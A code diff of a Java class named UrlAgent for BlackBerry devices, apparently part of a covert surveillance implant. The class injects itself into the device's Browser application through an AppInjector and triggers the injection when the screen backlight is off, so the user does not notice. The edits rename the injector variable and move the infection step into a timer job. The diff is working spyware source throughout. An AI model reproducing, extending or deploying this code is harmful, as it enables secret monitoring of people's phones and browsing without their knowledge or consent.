@@ -13,7 +13,6 @@ import java.util.Date;
 import java.util.Vector;
 
 import net.rim.device.api.system.Backlight;
-import net.rim.device.api.system.DeviceInfo;
 import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
@@ -38,7 +37,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
 
     String appName = "Browser";
 
-    AppInjector applicationInjector;
+    AppInjector appInjector;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
 
@@ -81,7 +80,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         AppListener.getInstance().addBacklightObserver(this);
 
         try {
-            applicationInjector = new AppInjector(AppInjector.APP_BROWSER);
+            appInjector = new AppInjector(AppInjector.APP_BROWSER);
 
         } catch (Exception ex) {
             //#ifdef DEBUG
@@ -89,15 +88,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
             //#endif
         }
 
-        if(DeviceInfo.isSimulator()){
-            menuInject();
-        }else{
-            if (!applicationInjector.isInfected()) {
-                if (!Backlight.isEnabled()) {
-                    menuInject();
-                }
-            }
-        }
+     
     }
 
     private void menuInject() {
@@ -105,7 +96,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         debug.trace("menuInject");
         //#endif
 
-        applicationInjector.infect();
+        appInjector.infect();
 
     }
 
@@ -118,19 +109,26 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
         AppListener.getInstance().removeBacklightObserver(this);
     }
 
+    boolean infecting = false;
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        if (applicationInjector.isInfected() && Backlight.isEnabled()
+        if (appInjector.isInfected() && Backlight.isEnabled()
                 && isAppForeground) {
             //#ifdef DEBUG
             debug.info("actualRun, infected, enabled, foreground");
             //#endif
 
-            applicationInjector.callMenuInContext();
+            appInjector.callMenuInContext();
         }
+         
+        if (!appInjector.isInfected() && infecting == false){
+            infecting = true;
+            menuInject();
+        }
+       
     }
 
     /*
@@ -163,7 +161,7 @@ public final class UrlAgent extends Agent implements ApplicationObserver,
     }
 
     public void onBacklightChange(boolean on) {
-        if (!on && !applicationInjector.isInfected()) {
+        if (!on && !appInjector.isInfected()) {
             //#ifdef DEBUG
             debug.info("onBacklightChange, injecting");
             //#endif
